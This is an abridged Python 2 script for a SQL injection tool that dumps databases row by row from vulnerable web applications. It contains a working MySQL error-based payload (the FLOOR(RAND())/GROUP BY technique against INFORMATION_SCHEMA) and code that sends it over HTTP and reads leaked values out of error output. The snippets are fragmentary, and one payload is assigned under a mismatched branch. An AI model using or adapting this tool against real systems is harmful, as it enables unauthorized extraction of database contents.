...
def build_injection_groupby(inj, req, row):
	inj = inj.replace("$$REQ$$", req)
	inj = inj.replace('$$LIM$$', str(row))
...
def get_nb_rows():
	...
	req = pattern.sub("select", req)

	pattern = re.compile("FROM", re.IGNORECASE)
	req = pattern.sub("from", req)

	pattern = re.compile("WHERE", re.IGNORECASE)
	req = pattern.sub("where", req)
...
def dump_row(row, echo, req):
	...
	while True:
		...
		# Use floor(rand()) / Group by method
		else:
			inj = build_injection_groupby(params['injection'], req, row)
			html = make_http_request(inj)
			ret = html[html.find('$$$')+3:]
			ret = ret[:ret.find('$$$')]
...
def main():
	...
	if params['type'] not in ('binary', 'regexp', 'groupby'):
		die('Invalid injection type. Possible values are: binary, regexp, groupby')
	...
	if params['type'] == 'binary':
		...
		params['injection'] = "' AND (SELECT 1 FROM(SELECT COUNT(1),CONCAT(0x242424,($$REQ$$ LIMIT $$LIM$$,1),0x242424,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND ''='"
	...
	print "Type      :", 'Binary Masks' if params['type'] == 'binary' else 'Regexp Errors' if params['type'] == 'regexp' else 'Group By'
	print "------------------------------------------------\n"
